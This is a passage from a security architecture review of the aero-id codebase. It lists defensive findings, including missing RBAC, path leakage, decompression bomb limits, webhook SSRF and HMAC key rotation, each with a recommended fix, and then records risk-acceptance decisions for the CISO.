| **No RBAC for admin operations** | Current | Any authenticated user with access to admin gRPC endpoints (if exposed) can escalate. **Fix**: implement gRPC permission interceptor for future admin methods |
| **Storage path leakage in error responses** | Current | Information disclosure. **Fix**: review all error wrapping paths, never expose internal paths in user-facing messages |
| **No decompression bomb protection** | Current + Pipeline | Exacerbated by pipeline. **Fix**: add size limits per pipeline stage |
| **Webhook URL SSRF (upcoming)** | Direction 5 | Must be resolved at design time, not after deployment |
| **HMAC key rotation support** | Current | Single key, no rotation path. **Fix**: add key versioning |

### Risk Acceptance (Documented Decisions)

The following are architecturally acceptable but should be documented for the CISO:

1. **6-minute token revocation window** — Acceptable given SSO outage tolerance, but must be documented in the incident response runbook.
2. **Per-instance rate limiting** — Acceptable for 1-2 instance deployments. For 3+ instances, Direction 2 (Redis rate limiter) becomes P1, not P1.5.
3. **No TLS in dev config** — Acceptable for development only. Production deployment scripts must enforce `insecure: false` and appropriate TLS configuration.
4. **Soft deletes as primary deletion mechanism** — Acceptable, but the GC retention policy period (`retention: 168h`) means deleted data persists for 7 days. Ensure this is GDPR-compliant for "right to erasure" requests (72h SLA typically).

---

*Review performed against codebase commit at `/home/u1/aero-id` and design documents `docs/results/2026-07-12-aero-id-high-level-extension-directions.out.arch.md` and `.impl-plan.md`.*
